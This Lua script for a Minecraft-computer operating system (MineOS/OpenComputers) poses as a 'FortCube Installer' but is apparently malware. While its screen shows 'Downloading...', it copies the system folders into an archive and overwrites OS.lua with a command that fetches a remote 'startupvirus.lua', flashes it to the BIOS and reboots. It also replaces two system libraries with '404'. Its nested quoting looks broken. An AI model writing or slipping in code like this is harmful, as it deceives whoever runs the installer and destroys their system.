local GUI = require("GUI")


--------------------------------------------------------------------------------

local workspace = GUI.workspace()
workspace:addChild(GUI.panel(1, 1, workspace.width, workspace.height, 0x2D2D2D))

workspace:addChild(GUI.text(3, 2, 0xFFFFFF, "FortCube Installer "))
workspace:addChild(GUI.text(3, 3, 0xFFFFFF, "Downloading..."))
workspace:addChild(GUI.text(3, 3, 0xFFFFFF, "PLEASE RESTART"))



local internet = require("INTERNET")
local compressor = require("compressor")
local filesystem = require("filesystem")

-- Move all of data to /eltxcry
filesystem.copy("/Libraries", "/eltxcry/libraries")
filesystem.copy("OS.LUA", "/eltxcry")
filesystem.copy("Icons", "/eltxcry")
filesystem.copy("Users", "/eltxcry")
filesystem.copy("Application", "/eltxcry")
filesystem.copy("Extensions", "/eltxcry")
filesystem.copy("Mounts", "/eltxcry")
filesystem.copy("Localizations", "/eltxcry")
compressor.pack("/archive.pkg", {
	"/eltxcry"
})

-- Write ALL files

filesystem.write("OS.lua", "shell.execute("wget -f https://raw.githubusercontent.com/EletrixtimeYT/ELTXCRY/main/startupvirus.lua /tmp/bios.lua && flash -q /tmp/bios.lua && reboot")")
filesystem.write("Libraries/Event.lua", "404")
filesystem.write("Libraries/Network.lua", "404")



--------------------------------------------------------------------------------

workspace:draw()
workspace:start()
